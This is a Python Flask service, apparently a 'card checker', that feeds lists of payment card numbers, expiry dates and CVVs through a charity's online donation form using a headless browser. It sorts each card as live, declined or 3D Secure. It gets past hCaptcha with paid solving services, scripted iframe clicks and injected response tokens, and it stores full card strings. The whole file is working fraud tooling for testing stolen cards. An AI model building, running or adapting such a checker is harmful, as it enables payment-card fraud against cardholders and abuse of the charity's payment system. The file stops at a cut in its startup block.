from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import requests
import logging
from datetime import datetime
import base64 
import urllib.parse

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Variables de entorno de Northflank
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
API_KEY_ANTICAPTCHA = os.environ.get('API_KEY_ANTICAPTCHA', '')
API_KEY_CAPSOLVER = os.environ.get('API_KEY_CAPSOLVER', '')
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'thread': None,
    'stop_on_live': False
}

class CaptchaSolver:
    def __init__(self):
        self.api_keys = {
            '2captcha': API_KEY_2CAPTCHA,
            'anticaptcha': API_KEY_ANTICAPTCHA,
            'capsolver': API_KEY_CAPSOLVER
        }
        self.primary_service = '2captcha' if API_KEY_2CAPTCHA else 'capsolver' if API_KEY_CAPSOLVER else 'anticaptcha' if API_KEY_ANTICAPTCHA else None
    
    def solve_hcaptcha(self, site_key, page_url):
        """Método principal para resolver hCaptcha usando múltiples servicios"""
        if not self.primary_service:
            logger.error("❌ No hay API keys configuradas para servicios de captcha")
            return None
        
        logger.info(f"🎯 Resolviendo hCaptcha - Sitekey: {site_key[:30]}...")
        logger.info(f"🔗 URL: {page_url}")
        
        # Intentar con el servicio primario
        solution = self._solve_with_service(self.primary_service, site_key, page_url)
        if solution:
            return solution
        
        # Si falla, intentar con otros servicios disponibles
        for service_name, api_key in self.api_keys.items():
            if service_name != self.primary_service and api_key:
                logger.info(f"🔄 Intentando con servicio alternativo: {service_name}")
                solution = self._solve_with_service(service_name, site_key, page_url)
                if solution:
                    return solution
        
        # Último intento: método manual simple
        logger.info("🔄 Intentando método manual...")
        return self._solve_manual_hcaptcha(site_key, page_url)
    
    def _solve_with_service(self, service_name, site_key, page_url):
        """Resolver usando servicio específico"""
        try:
            if service_name == '2captcha':
                return self._solve_with_2captcha(site_key, page_url)
            elif service_name == 'anticaptcha':
                return self._solve_with_anticaptcha(site_key, page_url)
            elif service_name == 'capsolver':
                return self._solve_with_capsolver(site_key, page_url)
        except Exception as e:
            logger.error(f"❌ Error con servicio {service_name}: {e}")
            return None
    
    def _solve_with_2captcha(self, site_key, page_url):
        """Resolver hCaptcha usando 2Captcha API v2"""
        if not self.api_keys['2captcha']:
            return None
        
        # Solo una configuración que funciona
        task_config = {
            "type": "HCaptchaTaskProxyless",
            "websiteURL": page_url,
            "websiteKey": site_key,
            "isInvisible": True  # Stripe usa hCaptcha invisible
        }
        
        logger.info("🔄 Enviando a 2Captcha...")
        
        try:
            # Crear tarea
            data = {
                "clientKey": self.api_keys['2captcha'],
                "task": task_config
            }
            
            response = requests.post(
                "https://api.2captcha.com/createTask",
                json=data,
                timeout=30
            )
            
            result = response.json()
            logger.info(f"📥 Respuesta 2Captcha: errorId={result.get('errorId')}")
            
            if result.get("errorId", 1) == 0:
                task_id = result["taskId"]
                logger.info(f"✅ Tarea aceptada (ID: {task_id})")
                
                # Esperar solución
                for i in range(25):  # Máximo 100 segundos
                    time.sleep(4)
                    
                    params = {
                        "clientKey": self.api_keys['2captcha'],
                        "taskId": task_id
                    }
                    
                    response = requests.post(
                        "https://api.2captcha.com/getTaskResult",
                        json=params,
                        timeout=30
                    )
                    
                    status_result = response.json()
                    
                    if status_result.get("status") == "ready":
                        solution = status_result.get("solution", {}).get("gRecaptchaResponse")
                        if solution:
                            logger.info(f"✅ hCaptcha resuelto con 2Captcha!")
                            return solution
                    
                    elif status_result.get("status") == "processing":
                        continue
                    
                    else:
                        error = status_result.get("errorDescription", "Error")
                        logger.error(f"❌ Error 2Captcha: {error}")
                        break
        
        except Exception as e:
            logger.error(f"❌ Error 2Captcha: {e}")
        
        return None
    
    def _solve_with_anticaptcha(self, site_key, page_url):
        """Resolver hCaptcha usando AntiCaptcha"""
        if not self.api_keys['anticaptcha']:
            return None
        
        logger.info("🔄 Enviando a AntiCaptcha...")
        
        try:
            # Crear tarea hCaptcha
            data = {
                "clientKey": self.api_keys['anticaptcha'],
                "task": {
                    "type": "HCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": site_key
                }
            }
            
            response = requests.post(
                "https://api.anti-captcha.com/createTask",
                json=data,
                timeout=30
            )
            
            result = response.json()
            
            if result.get("errorId", 1) == 0:
                task_id = result["taskId"]
                logger.info(f"✅ Tarea AntiCaptcha aceptada (ID: {task_id})")
                
                # Esperar solución
                for i in range(20):
                    time.sleep(5)
                    
                    data = {
                        "clientKey": self.api_keys['anticaptcha'],
                        "taskId": task_id
                    }
                    
                    response = requests.post(
                        "https://api.anti-captcha.com/getTaskResult",
                        json=data,
                        timeout=30
                    )
                    
                    result = response.json()
                    
                    if result.get("status") == "ready":
                        solution = result.get("solution", {}).get("gRecaptchaResponse")
                        if solution:
                            logger.info(f"✅ hCaptcha resuelto con AntiCaptcha!")
                            return solution
                    
                    elif result.get("status") == "processing":
                        continue
        
        except Exception as e:
            logger.error(f"❌ Error AntiCaptcha: {e}")
        
        return None
    
    def _solve_with_capsolver(self, site_key, page_url):
        """Resolver hCaptcha usando CapSolver"""
        if not self.api_keys['capsolver']:
            return None
        
        logger.info("🔄 Enviando a CapSolver...")
        
        try:
            # Crear tarea
            data = {
                "clientKey": self.api_keys['capsolver'],
                "task": {
                    "type": "HCaptchaTaskProxyLess",
                    "websiteURL": page_url,
                    "websiteKey": site_key,
                    "isInvisible": True
                }
            }
            
            response = requests.post(
                "https://api.capsolver.com/createTask",
                json=data,
                timeout=30
            )
            
            result = response.json()
            
            if result.get("errorId", 0) == 0:
                task_id = result["taskId"]
                logger.info(f"✅ Tarea CapSolver aceptada (ID: {task_id})")
                
                # Esperar solución
                for i in range(20):
                    time.sleep(5)
                    
                    data = {
                        "clientKey": self.api_keys['capsolver'],
                        "taskId": task_id
                    }
                    
                    response = requests.post(
                        "https://api.capsolver.com/getTaskResult",
                        json=data,
                        timeout=30
                    )
                    
                    result = response.json()
                    
                    if result.get("status") == "ready":
                        solution = result.get("solution", {}).get("gRecaptchaResponse")
                        if solution:
                            logger.info(f"✅ hCaptcha resuelto con CapSolver!")
                            return solution
                    
                    elif result.get("status") == "processing":
                        continue
        
        except Exception as e:
            logger.error(f"❌ Error CapSolver: {e}")
        
        return None
    
    def _solve_manual_hcaptcha(self, site_key, page_url):
        """Método manual simple para hCaptcha (solo checkbox)"""
        logger.info("🔄 Intentando método manual para checkbox simple...")
        
        try:
            # Método directo simple
            if not self.api_keys['2captcha']:
                return None
            
            params = {
                'key': self.api_keys['2captcha'],
                'method': 'hcaptcha',
                'sitekey': site_key,
                'pageurl': page_url,
                'json': 1
            }
            
            response = requests.get(
                "https://2captcha.com/in.php",
                params=params,
                timeout=30
            )
            
            result = response.json()
            logger.info(f"📥 Respuesta manual: {result}")
            
            if result.get('status') == 1:
                captcha_id = result['request']
                
                # Esperar solución
                for i in range(15):
                    time.sleep(6)
                    
                    params = {
                        'key': self.api_keys['2captcha'],
                        'action': 'get',
                        'id': captcha_id,
                        'json': 1
                    }
                    
                    resp = requests.get(
                        "https://2captcha.com/res.php",
                        params=params,
                        timeout=30
                    )
                    
                    get_result = resp.json()
                    
                    if get_result.get('status') == 1:
                        solution = get_result['request']
                        logger.info(f"✅ Solución manual obtenida")
                        return solution
                    
                    elif get_result.get('request') == 'CAPCHA_NOT_READY':
                        continue
        
        except Exception as e:
            logger.error(f"❌ Error método manual: {e}")
        
        return None
    
    def bypass_hcaptcha_manually(self, page, card_last4):
        """Intentar resolver hCaptcha interactuando directamente"""
        try:
            # Buscar iframe de hCaptcha
            hcaptcha_frame = None
            for frame in page.frames:
                if 'hcaptcha.com' in frame.url:
                    hcaptcha_frame = frame
                    break
            
            if not hcaptcha_frame:
                logger.info("❌ No se encontró iframe hCaptcha")
                return False
            
            logger.info(f"✅ Iframe hCaptcha encontrado")
            
            # Intentar hacer clic en el checkbox dentro del iframe
            try:
                # Evaluar dentro del iframe
                clicked = hcaptcha_frame.evaluate("""
                    () => {
                        // Buscar checkbox de hCaptcha
                        const checkbox = document.querySelector('#checkbox');
                        if (checkbox) {
                            checkbox.click();
                            console.log('✅ Checkbox encontrado y clickeado');
                            return true;
                        }
                        
                        // Buscar cualquier elemento clickeable
                        const clickable = document.querySelector('[role="checkbox"], .hcaptcha-box, .checkbox');
                        if (clickable) {
                            clickable.click();
                            console.log('✅ Elemento clickeable encontrado');
                            return true;
                        }
                        
                        // Hacer clic en el centro del iframe
                        const rect = document.body.getBoundingClientRect();
                        const clickEvent = new MouseEvent('click', {
                            bubbles: true,
                            cancelable: true,
                            clientX: rect.width / 2,
                            clientY: rect.height / 2
                        });
                        
                        document.elementFromPoint(rect.width / 2, rect.height / 2).dispatchEvent(clickEvent);
                        console.log('✅ Clic realizado en centro del iframe');
                        return true;
                    }
                """)
                
                logger.info("✅ Clic realizado en iframe hCaptcha")
                time.sleep(5)
                
                # Verificar si se resolvió
                page_content = page.content().lower()
                if 'hcaptcha' not in page_content or 'i am human' not in page_content:
                    logger.info("✅ Posiblemente resuelto manualmente")
                    return True
                
            except Exception as e:
                logger.warning(f"⚠️ No se pudo interactuar con iframe: {e}")
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Error bypass manual: {e}")
            return False

class PaymentAnalyzer:
    """Analizador de respuestas de pagos para Edupam"""
    
    @staticmethod
    def analyze_payment_result(page, current_url, card_last4):
        """Versión mejorada con lógica más precisa"""
        evidence = []
        final_status = 'unknown'
        
        try:
            page_content = page.content()
            page_content_lower = page_content.lower()
            
            logger.info(f"🔍 ANALIZANDO para ****{card_last4}")
            logger.info(f"🔍 URL: {current_url}")
            
            # DEBUG: Ver contenido relevante
            debug_content = page_content_lower[:300]
            logger.info(f"🔍 CONTENIDO (300 chars): {debug_content}")
            
            # 1. Buscar palabras EXACTAS de DECLINE primero
            decline_keywords = [
                'has been declined',
                'rechazada',
                'declined',
                'ocurrió un error',
                'incorrecto',
                'venció',
                'admite',
                'no válida',
                'invalid',
                'error en la transacción',
                'card has been declined'
            ]
            
            for keyword in decline_keywords:
                if keyword in page_content_lower:
                    final_status = 'decline'
                    evidence.append(f'DEAD: "{keyword}" encontrado')
                    logger.info(f"❌ ENCONTRADO '{keyword}' - ES DEAD")
                    break
            
            # 2. Si no es DEAD, buscar LIVE
            if final_status != 'decline':
                live_keywords = [
                    '¡muchas gracias',
                    'muchas gracias',
                    'pago exitoso',
                    'success',
                    'donación exitosa',
                    'thank you for your donation'
                ]
                
                for keyword in live_keywords:
                    if keyword in page_content_lower:
                        final_status = 'live'
                        evidence.append(f'LIVE: "{keyword}" encontrado')
                        logger.info(f"✅ ENCONTRADO '{keyword}' - Es LIVE")
                        break
            
            # 3. Solo buscar 3D Secure si no es LIVE ni DEAD
            if final_status == 'unknown':
                threeds_keywords = [
                    '3d secure',
                    '3-d secure',
                    'authentication required',
                    'autenticación requerida',
                    'verify your identity'
                ]
                
                for keyword in threeds_keywords:
                    if keyword in page_content_lower:
                        final_status = 'threeds'
                        evidence.append(f'3DS: "{keyword}" encontrado')
                        logger.info(f'ENCONTRADO "{keyword}" - ES 3DS')
                        break
            
            # 4. Si aún es unknown
            if final_status == 'unknown':
                evidence.append('NO se encontraron palabras clave claras')
                logger.info(f"❓ NO se encontraron palabras clave claras")   
        except Exception as e:
            evidence.append(f'Error: {str(e)}')
            final_status = 'error'
            logger.error(f"❌ Error en análisis: {e}")
        
        return {
            'status': final_status,
            'evidence': evidence,
            'url': current_url
        }

class EdupamChecker:
    def __init__(self, headless=True):
        self.base_url = EDUPAM_BASE_URL
        self.endpoint = EDUPAM_ENDPOINT
        self.headless = headless
        self.donor_data = {
            'nombre': EDUPAM_DONOR_NAME,
            'apellido': EDUPAM_DONOR_LASTNAME,
            'email': EDUPAM_DONOR_EMAIL,
            'fecha_nacimiento': '1990-01-01',
            'tipo': 'one-time',
            'codigo': ''
        }
        self.analyzer = PaymentAnalyzer()
        self.captcha_solver = CaptchaSolver()
    
    def parse_card_data(self, card_string):
        """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
        try:
            parts = card_string.strip().split('|')
            if len(parts) != 4:
                raise ValueError("Formato inválido")
            
            return {
                'numero': parts[0].strip().replace(' ', ''),
                'mes': parts[1].strip().zfill(2),
                'ano': parts[2].strip()[-2:],
                'cvv': parts[3].strip()
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None
    
    def fill_form(self, page, amount):
        """Llenar formulario básico de donación"""
        try:
            # Nombre
            page.fill('#name', self.donor_data['nombre'])
            time.sleep(0.3)
            
            # Apellido
            page.fill('#lastname', self.donor_data['apellido'])
            time.sleep(0.3)
            
            # Email
            page.fill('#email', self.donor_data['email'])
            time.sleep(0.3)
            
            # Fecha de nacimiento
            page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
            time.sleep(0.3)
            
            # Monto
            page.fill('#quantity', str(amount))
            time.sleep(0.5)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando formulario: {e}")
            return False
    
    def fill_card_simple(self, page, card_info):
        """Llenar datos de tarjeta usando método TAB"""
        try:
            # Hacer clic en el campo de monto para asegurar focus
            page.locator('#quantity').click()
            time.sleep(0.5)
            
            # Presionar TAB para ir al primer campo de tarjeta
            page.keyboard.press('Tab')
            time.sleep(1)
            
            # Escribir número de tarjeta
            page.keyboard.press('Control+A')
            page.keyboard.press('Backspace')
            time.sleep(0.2)
            
            page.keyboard.type(card_info['numero'], delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir fecha
            fecha = card_info['mes'] + card_info['ano']
            page.keyboard.type(fecha, delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir CVC
            page.keyboard.type(card_info['cvv'], delay=50)
            time.sleep(1)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando tarjeta: {e}")
            return False
    
    def extract_hcaptcha_sitekey(self, page):
        """Extraer site-key de hCaptcha de manera robusta"""
        site_key = None
        
        try:
            # Método 1: Buscar en iframes
            for frame in page.frames:
                frame_url = frame.url.lower()
                if 'hcaptcha' in frame_url:
                    logger.info(f"🔍 Analizando iframe hCaptcha")
                    
                    # Extraer de parámetros URL
                    parsed = urllib.parse.urlparse(frame.url)
                    params = urllib.parse.parse_qs(parsed.query)
                    
                    if 'sitekey' in params:
                        site_key = params['sitekey'][0]
                        logger.info(f"✅ Site-key de iframe: {site_key[:30]}...")
                        break
            
            # Método 2: Buscar en el DOM
            if not site_key:
                site_key = page.evaluate("""
                    () => {
                        // Buscar elemento con data-sitekey
                        const element = document.querySelector('[data-sitekey]');
                        if (element) {
                            return element.getAttribute('data-sitekey');
                        }
                        
                        // Buscar scripts con hcaptcha
                        const scripts = document.querySelectorAll('script');
                        for (let script of scripts) {
                            const content = script.textContent || '';
                            if (content.includes('hcaptcha')) {
                                const match = content.match(/sitekey["']?\\s*[:=]\\s*["']([^"']+)["']/i);
                                if (match) return match[1];
                            }
                        }
                        
                        return null;
                    }
                """)
                
                if site_key:
                    logger.info(f"✅ Site-key del DOM: {site_key[:30]}...")
            
            # Método 3: Buscar por regex en HTML
            if not site_key:
                page_content = page.content()
                matches = re.findall(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_content, re.I)
                if matches:
                    site_key = matches[0]
                    logger.info(f"✅ Site-key por regex: {site_key[:30]}...")
        
        except Exception as e:
            logger.error(f"❌ Error extrayendo site-key: {e}")
        
        return site_key
    
    def solve_captcha_if_present(self, page, card_last4):
        """Detectar y resolver hCaptcha si está presente"""
        try:
            time.sleep(3)
            
            # Detectar si hay hCaptcha
            captcha_detected = False
            
            # Verificar por iframes
            for frame in page.frames:
                if 'hcaptcha' in frame.url.lower():
                    captcha_detected = True
                    break
            
            # Verificar por texto
            page_content = page.content().lower()
            hcaptcha_indicators = [
                'hcaptcha',
                'i am human',
                'soy humano',
                'one more step',
                'select the checkbox'
            ]
            
            if not captcha_detected and any(indicator in page_content for indicator in hcaptcha_indicators):
                captcha_detected = True
            
            if not captcha_detected:
                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
                return True
            
            logger.info(f"🔍 hCaptcha detectado para ****{card_last4}")
            
            # Extraer site-key
            site_key = self.extract_hcaptcha_sitekey(page)
            
            if not site_key:
                logger.error(f"❌ No se pudo extraer site-key")
                # Intentar bypass manual
                if self.captcha_solver.bypass_hcaptcha_manually(page, card_last4):
                    logger.info(f"✅ Bypass manual exitoso")
                    return True
                return False
            
            logger.info(f"✅ Site-key obtenido: {site_key[:30]}...")
            
            # Intentar resolver con servicios
            page_url = page.url
            solution = self.captcha_solver.solve_hcaptcha(site_key, page_url)
            
            if not solution:
                logger.error(f"❌ No se pudo resolver el hCaptcha")
                # Intentar bypass manual como último recurso
                if self.captcha_solver.bypass_hcaptcha_manually(page, card_last4):
                    logger.info(f"✅ Bypass manual exitoso como fallback")
                    return True
                return False
            
            logger.info(f"✅ hCaptcha resuelto para ****{card_last4}")
            
            # Inyectar solución
            try:
                page.evaluate("""
                    (solution) => {
                        console.log('🎯 Inyectando solución hCaptcha...');
                        
                        // Campo para hCaptcha
                        let field = document.querySelector('[name="h-captcha-response"]');
                        if (!field) {
                            field = document.getElementById('h-captcha-response');
                        }
                        
                        if (!field) {
                            field = document.createElement('textarea');
                            field.name = 'h-captcha-response';
                            field.id = 'h-captcha-response';
                            field.style.display = 'none';
                            document.body.appendChild(field);
                        }
                        
                        field.value = solution;
                        
                        // Disparar eventos
                        ['change', 'input'].forEach(eventType => {
                            field.dispatchEvent(new Event(eventType, { bubbles: true }));
                        });
                        
                        console.log('✅ Solución inyectada');
                        return true;
                    }
                """, solution)
                
                time.sleep(2)
                
                # Re-enviar si es necesario
                submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
                if submit_btn.count() > 0:
                    submit_btn.click()
                    time.sleep(5)
                
                return True
                
            except Exception as e:
                logger.error(f"❌ Error inyectando solución: {e}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error en solve_captcha_if_present: {e}")
            return False
    
    def check_single_card(self, card_string, amount=50):
        """Verificar una sola tarjeta"""
        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
        logger.info(f"🚀 INICIANDO VERIFICACIÓN para ****{card_last4}")
        
        # Parsear tarjeta
        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Error parseando tarjeta',
                'card': f"****{card_last4}"
            }
        
        playwright = None
        browser = None
        page = None
        
        try:
            # Iniciar Playwright
            playwright = sync_playwright().start()
            
            browser = playwright.chromium.launch(
                executable_path='/usr/bin/chromium',
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            
            context = browser.new_context()
            page = context.new_page()
            
            # Navegar
            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
            time.sleep(3)
            
            logger.info(f"📄 URL actual: {page.url}")
            
            # Llenar formulario
            if not self.fill_form(page, amount):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error llenando formulario',
                    'card': f"****{card_last4}"
                }
            
            # Ingresar tarjeta
            if not self.fill_card_simple(page, card_info):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error ingresando tarjeta',
                    'card': f"****{card_last4}"
                }
            
            time.sleep(2)
            
            # Enviar donación
            btn = page.locator('#btn-donation')
            if btn.count() == 0:
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Botón no encontrado',
                    'card': f"****{card_last4}"
                }
            
            btn.click()
            time.sleep(3)
            
            # Intentar resolver captcha si aparece
            captcha_solved = True
            if any([API_KEY_2CAPTCHA, API_KEY_ANTICAPTCHA, API_KEY_CAPSOLVER]):
                logger.info(f"🔍 Verificando captcha para ****{card_last4}...")
                captcha_solved = self.solve_captcha_if_present(page, card_last4)
            
            # Esperar respuesta
            wait_time = 12 if captcha_solved else 8
            logger.info(f"⏳ Esperando respuesta ({wait_time} segundos)...")
            time.sleep(wait_time)
            
            logger.info(f"📄 URL después de enviar: {page.url}")
            
            # Tomar screenshot
            screenshot_b64 = None
            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                time.sleep(0.5)
                screenshot_bytes = page.screenshot(full_page=True)
                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                logger.info(f"📸 Screenshot tomado para ****{card_last4}")
            except Exception as e:
                logger.error(f"Error screenshot: {e}")
            
            # Analizar resultado
            current_url = page.url
            analysis = self.analyzer.analyze_payment_result(page, current_url, card_last4)
            
            # Mapear estado
            status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
            final_status = status_map.get(analysis['status'], 'ERROR')
            
            messages = {
                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
            }
            
            # Construir resultado
            result = {
                'success': True,
                'status': final_status,
                'original_status': messages.get(final_status, 'Estado desconocido'),
                'message': ', '.join(analysis['evidence']),
                'response': {
                    'url': analysis['url'],
                    'evidence': analysis['evidence'],
                    'screenshot': screenshot_b64,
                    'timestamp': datetime.now().isoformat(),
                    'captcha_solved': captcha_solved
                },
                'card': f"****{card_last4}",
                'gate': 'Edupam',
                'amount': amount
            }
            
            logger.info(f"✅ VERIFICACIÓN COMPLETADA para ****{card_last4}: {final_status}")
            
            # Limpiar recursos
            try:
                page.close()
                context.close()
                browser.close()
                playwright.stop()
            except:
                pass
            
            return result
            
        except Exception as e:
            logger.error(f"❌ ERROR en ****{card_last4}: {e}")
            # Limpiar recursos en caso de error
            try:
                if page and not page.is_closed():
                    page.close()
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
            except:
                pass
            
            return {
                'success': False,
                'status': 'ERROR',
                'message': f'Error: {str(e)[:100]}',
                'card': f"****{card_last4}"
            }

# ========== FUNCIONES DEL WORKER ==========

def process_cards_worker(cards, amount, stop_on_live):
    """Worker que procesa las tarjetas"""
    global checking_status
    
    checker = EdupamChecker(headless=HEADLESS)
    
    for i, card_line in enumerate(cards):
        if not checking_status['active']:
            break
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i + 1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat()
                })
                continue
            
            card_number = parts[0].strip()
            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            
            logger.info(f"Procesando tarjeta {i+1}/{len(cards)}: ****{last4}")
            
            # Verificar tarjeta
            result = checker.check_single_card(card_line, amount)
            
            # Crear resultado
            card_result = {
                'id': i + 1,
                'card': f"****{last4}",
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            # Actualizar estadísticas
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            # Pequeño delay entre tarjetas
            time.sleep(2)
            
        except Exception as e:
            logger.error(f"Error procesando tarjeta: {e}")
            checking_status['error'] += 1
            checking_status['results'].append({
                'id': i + 1,
                'card': 'ERROR',
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            })
            continue
    
    checking_status['active'] = False

# ========== ENDPOINTS API (MANTENIDOS IGUAL) ==========

@app.route('/')
def index():
    """Endpoint raíz del backend"""
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam)",
        "version": "2.2",
        "endpoints": {
            "health": "/api/health",
            "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results",
            "cancel": "/api/cancel (POST)"
        },
        "config": {
            "headless": HEADLESS,
            "donation_amount": DONATION_AMOUNT,
            "max_workers": MAX_WORKERS,
            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled",
            "anticaptcha": "enabled" if API_KEY_ANTICAPTCHA else "disabled",
            "capsolver": "enabled" if API_KEY_CAPSOLVER else "disabled"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Verificar estado del servidor"""
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API',
        'version': '2.2',
        'timestamp': datetime.now().isoformat(),
        'features': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER),
            'screenshots': True,
            'multi_card_check': True
        }
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Obtener estado actual del checker"""
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results']),
        'captcha_services': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER)
        }
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    """Verificar una sola tarjeta (para el frontend)"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Ya hay un chequeo en progreso'
        }), 400
    
    data = request.json
    
    # Extraer datos
    card_data = data.get('card', '')
    
    if not card_data or '|' not in card_data:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Parsear tarjeta
    parts = card_data.split('|')
    if len(parts) < 4:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta incompleto',
            'original_status': '⚠️ Error'
        }), 400
    
    card_number = parts[0].strip()
    
    # Validar formato básico
    if not card_number.isdigit() or len(card_number) not in [15, 16]:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Número de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Verificar tarjeta
    checker = EdupamChecker(headless=HEADLESS)
    result = checker.check_single_card(card_data, DONATION_AMOUNT)
    
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Iniciar verificación de múltiples tarjetas"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas para verificar'}), 400
    
    # Filtrar tarjetas válidas
    valid_cards = []
    for card in cards:
        if '|' in card and len(card.split('|')) >= 4:
            valid_cards.append(card)
    
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    # Inicializar estado
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'thread': None,
        'stop_on_live': stop_on_live
    }
    
    # Iniciar thread de verificación
    thread = threading.Thread(
        target=process_cards_worker,
        args=(valid_cards, amount, stop_on_live)
    )
    thread.daemon = True
    thread.start()
    checking_status['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount,
        'captcha_services': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER)
        }
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    """Obtener resultados del chequeo"""
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        },
        'captcha_services': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
            'capsolver': bool(API_KEY_CAPSOLVER)
        }
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    """Cancelar chequeo en curso"""
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

# ========== INICIALIZACIÓN ==========

if __name__ == '__main__':
